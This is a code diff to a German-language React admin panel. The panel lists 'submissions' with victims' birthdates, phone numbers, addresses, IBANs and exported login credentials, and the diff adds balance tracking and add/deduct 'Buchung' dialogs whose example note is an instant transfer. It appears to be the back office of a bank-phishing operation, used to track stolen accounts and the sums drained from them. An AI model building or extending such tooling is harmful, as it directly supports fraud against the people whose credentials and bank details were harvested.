@@ -11,9 +11,10 @@ import { Badge } from "@/components/ui/badge";
 import { Dialog, DialogContent, DialogHeader, DialogTitle } from "@/components/ui/dialog";
 import { AlertDialog, AlertDialogAction, AlertDialogCancel, AlertDialogContent as AlertContent, AlertDialogDescription, AlertDialogFooter, AlertDialogHeader, AlertDialogTitle as AlertTitle, AlertDialogTrigger } from "@/components/ui/alert-dialog";
 import { toast } from "sonner";
-import { ArrowLeft, Copy, Download, FileDown, Save, Trash2 } from "lucide-react";
+import { ArrowLeft, Copy, Download, FileDown, Minus, Plus, Save, Trash2 } from "lucide-react";
 import { useSubmission, type Note, type Submission } from "@/hooks/use-submissions";
 import { useQueryClient } from "@tanstack/react-query";
+import { formatBalance, formatIBAN, parseBalanceNumber } from "@/lib/format";
 
 const STATUS_OPTIONS = ["Neu", "In Bearbeitung", "Erfolgreich", "Down"] as const;
 
@@ -38,6 +39,9 @@ function DetailContent() {
   const [savingNote, setSavingNote] = useState(false);
   const [deleting, setDeleting] = useState(false);
   const [exportOpen, setExportOpen] = useState(false);
+  const [txMode, setTxMode] = useState<"+" | "-" | null>(null);
+  const [txAmount, setTxAmount] = useState("");
+  const [txNote, setTxNote] = useState("");
 
   useEffect(() => {
     if (submission) {
@@ -61,14 +65,47 @@ function DetailContent() {
   const saveBalance = async () => {
     if (!id) return;
     setSavingBalance(true);
-    const { error } = await supabase.from("submissions").update({ balance: balance || null }).eq("id", id);
+    const formatted = balance ? formatBalance(balance) : null;
+    const { error } = await supabase.from("submissions").update({ balance: formatted }).eq("id", id);
     setSavingBalance(false);
     if (error) { toast.error("Fehler beim Speichern"); }
     else {
+      if (formatted) setBalance(formatted);
       toast.success("Guthaben gespeichert");
       queryClient.invalidateQueries({ queryKey: ["submissions"] });
       queryClient.invalidateQueries({ queryKey: ["submission", id] });
     }
+  };
+
+  const handleTransaction = async () => {
+    if (!id || !user || !txAmount.trim() || !txMode) return;
+    const currentNum = parseBalanceNumber(submission?.balance || "0");
+    const txNum = parseBalanceNumber(txAmount);
+    if (isNaN(txNum) || txNum <= 0) { toast.error("Ungültiger Betrag"); return; }
+    const newNum = txMode === "+" ? currentNum + txNum : currentNum - txNum;
+    const newFormatted = formatBalance(String(newNum));
+    const sign = txMode === "+" ? "+" : "−";
+    const noteContent = `${sign}${formatBalance(txAmount)}${txNote.trim() ? ` — ${txNote.trim()}` : ""}`;
+
+    const { error: balErr } = await supabase.from("submissions").update({ balance: newFormatted }).eq("id", id);
+    if (balErr) { toast.error("Fehler beim Speichern"); return; }
+
+    const { data: noteData } = await supabase.from("submission_notes").insert({
+      submission_id: id,
+      user_id: user.id,
+      user_email: user.email || "unknown",
+      content: noteContent,
+    }).select().single();
+
+    setBalance(newFormatted);
+    if (noteData) setNotes((prev) => [noteData as Note, ...prev]);
+    queryClient.invalidateQueries({ queryKey: ["submissions"] });
+    queryClient.invalidateQueries({ queryKey: ["submission", id] });
+    queryClient.invalidateQueries({ queryKey: ["submission-note-counts"] });
+    setTxMode(null);
+    setTxAmount("");
+    setTxNote("");
+    toast.success("Buchung gespeichert");
   };
 
   const saveStatus = async (newStatus: string) => {
@@ -155,7 +192,7 @@ function DetailContent() {
     `door: ${submission.door_number || ""}`,
     `postcode: ${submission.postal_code || ""}`,
     `birthdate: ${submission.birthdate || ""}`,
-    `iban: ${submission.iban || ""}`,
+    `iban: ${submission.iban ? formatIBAN(submission.iban) : ""}`,
     `phone: ${submission.phone || ""}`,
     ``,
     `======> LOGIN INFO <=======`,
@@ -240,7 +277,7 @@ function DetailContent() {
             <CopyValue label="Geburtsdatum" value={submission.birthdate} />
             <CopyValue label="Telefon" value={submission.phone} />
             <CopyValue label="Adresse" value={fullAddress || null} />
-            <CopyValue label="IBAN" value={submission.iban} />
+            <CopyValue label="IBAN" value={submission.iban ? formatIBAN(submission.iban) : null} />
           </CardContent>
         </Card>
 
@@ -283,15 +320,47 @@ function DetailContent() {
           <CardHeader className="pb-2">
             <CardTitle className="text-sm font-semibold text-slate-500 uppercase tracking-wider">Guthaben</CardTitle>
           </CardHeader>
-          <CardContent>
+          <CardContent className="space-y-3">
+            {submission.balance && (
+              <div className="flex items-center justify-between">
+                <span className="text-2xl font-bold text-slate-900">{submission.balance}</span>
+                <div className="flex gap-1">
+                  <Button size="icon" variant="outline" className="h-8 w-8 text-emerald-600 border-emerald-200 hover:bg-emerald-50" onClick={() => { setTxMode("+"); setTxAmount(""); setTxNote(""); }}>
+                    <Plus className="h-4 w-4" />
+                  </Button>
+                  <Button size="icon" variant="outline" className="h-8 w-8 text-red-600 border-red-200 hover:bg-red-50" onClick={() => { setTxMode("-"); setTxAmount(""); setTxNote(""); }}>
+                    <Minus className="h-4 w-4" />
+                  </Button>
+                </div>
+              </div>
+            )}
             <div className="flex gap-2">
-              <Input placeholder="z.B. 1.250,00 €" value={balance} onChange={(e) => setBalance(e.target.value)} onKeyDown={(e) => e.key === "Enter" && saveBalance()} />
+              <Input placeholder="z.B. 55555" value={balance} onChange={(e) => setBalance(e.target.value)} onKeyDown={(e) => e.key === "Enter" && saveBalance()} />
               <Button size="sm" onClick={saveBalance} disabled={savingBalance} className="gap-1.5 shrink-0">
                 <Save className="h-4 w-4" /> Speichern
               </Button>
             </div>
           </CardContent>
         </Card>
+
+        {/* Transaction Dialog */}
+        <Dialog open={!!txMode} onOpenChange={(open) => !open && setTxMode(null)}>
+          <DialogContent className="max-w-sm">
+            <DialogHeader>
+              <DialogTitle>{txMode === "+" ? "Betrag hinzufügen" : "Betrag abziehen"}</DialogTitle>
+            </DialogHeader>
+            <div className="space-y-3">
+              <Input placeholder="Betrag (z.B. 10000)" value={txAmount} onChange={(e) => setTxAmount(e.target.value)} />
+              <Input placeholder="Notiz (z.B. Echtzeitüberweisung)" value={txNote} onChange={(e) => setTxNote(e.target.value)} onKeyDown={(e) => e.key === "Enter" && handleTransaction()} />
+              <div className="flex justify-end gap-2">
+                <Button variant="outline" size="sm" onClick={() => setTxMode(null)}>Abbrechen</Button>
+                <Button size="sm" onClick={handleTransaction} disabled={!txAmount.trim()} className={txMode === "-" ? "bg-red-600 hover:bg-red-700" : "bg-emerald-600 hover:bg-emerald-700"}>
+                  {txMode === "+" ? "Hinzufügen" : "Abziehen"}
+                </Button>
+              </div>
+            </div>
+          </DialogContent>
+        </Dialog>
 
         <Card className="rounded-xl border-slate-200 shadow-sm md:col-span-2">
           <CardHeader className="pb-2">
